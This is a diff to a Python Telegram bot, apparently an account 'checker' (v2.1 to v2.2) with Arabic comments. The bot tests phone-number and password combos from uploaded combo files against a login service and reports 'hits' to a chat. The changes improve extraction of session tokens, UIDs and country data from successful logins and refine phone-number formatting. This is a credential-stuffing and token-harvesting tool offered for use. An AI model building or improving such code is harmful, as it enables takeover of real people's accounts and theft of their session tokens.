@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # ╔══════════════════════════════════════════════════════════╗
-# ║    📱  Xena Live — Telegram Bot Checker v2.1            ║
+# ║    📱  Xena Live — Telegram Bot Checker v2.2            ║
 # ╚══════════════════════════════════════════════════════════╝
 
 import os
@@ -204,11 +204,27 @@ def _parse_login(data):
         r = {"ok": True, "status": "hit", "uid": "", "token": "", "country": "", "platform": "", "shortUID": 0}
         f = _fget(top, 2)
         if f: r["shortUID"] = f[2]
+        
         for fld_n in (3, 4):
             f = _fget(top, fld_n)
             if f and f[3]:
-                s = f[3].decode(errors="replace")
-                if len(s) >= 32 and not r["token"]: r["token"] = s
+                # محاولة فك الرسالة المتداخلة للتوكن لتجنب أخطاء الـ Metadata
+                try:
+                    sub_fields = _proto(f[3])
+                    for sf in sub_fields:
+                        if sf[1] == 2 and sf[3]:
+                            cand = sf[3].decode(errors="replace").strip()
+                            if len(cand) >= 32 and not r["token"]:
+                                r["token"] = cand
+                except:
+                    pass
+                
+                # التحقق الاحتياطي لو كان التوكن نصاً مباشراً ونظيفاً
+                if not r["token"]:
+                    s = f[3].decode(errors="replace").strip()
+                    if len(s) >= 32 and "\n" not in s and "\x10" not in s:
+                        r["token"] = s
+                        
         f = _fget(top, 8)
         if f and f[3]: r["country"] = f[3].decode(errors="replace")
         f = _fget(top, 9)
@@ -294,21 +310,18 @@ def format_hit_msg(phone, pw, r, acct, via="DIRECT"):
 def detect_country_and_format(phone_input):
     phone_input = phone_input.strip().replace("+", "")
     
-    # التحقق مما إذا كان الرقم يبدأ بررمز دولة معروف مسبقاً
     for cc, data in COUNTRY_MAP.items():
         code = data["code"]
         if phone_input.startswith(code):
             local = phone_input[len(code):].lstrip("-")
             return f"{code}-{local}", cc
             
-    # مطابقة البادئات (Prefs) الخاصة بالدول إذا لم يوجد رمز دولة
     for cc, data in COUNTRY_MAP.items():
         clean_input = phone_input[1:] if phone_input.startswith("0") else phone_input
         for pref in data["prefs"]:
             if clean_input.startswith(pref):
                 return f"{data['code']}-{clean_input}", cc
                 
-    # القيمة الافتراضية إذا لم يتم التعرف عليها
     return phone_input, "SA"
 
 # ══════════════════════════════════════════════════════════
@@ -356,7 +369,6 @@ def process_single(message):
     raw_phone = parts[0].strip()
     custom_pw = parts[1].strip() if len(parts) > 1 else None
     
-    # التعرف التلقائي على الدولة وتنسيق الرقم بالشكل المطابق
     phone, country = detect_country_and_format(raw_phone)
     
     bot.send_message(message.chat.id, f"🔍 جاري فحص الرقم: `{phone}` (الدولة: {country})...", parse_mode="Markdown")
@@ -438,7 +450,7 @@ def run_combo_checker(chat_id, file_path):
         
         bot.send_message(chat_id, f"🏁 **انتهى فحص الكومبو!**\nإجمالي السطور: {total}\nتم العثور على: {hits_count} Hit", parse_mode="Markdown")
     except Exception as e:
-        bot.send_message(chat_id, f"⚠️ حدث خطأ أثناء قراءة الملف: {e}")
+        bot.send_message(chat_id, f"⚠️ حدث خطأ أثناء فحص الملف: {e}")
     finally:
         cli.close()
         if os.path.exists(file_path):
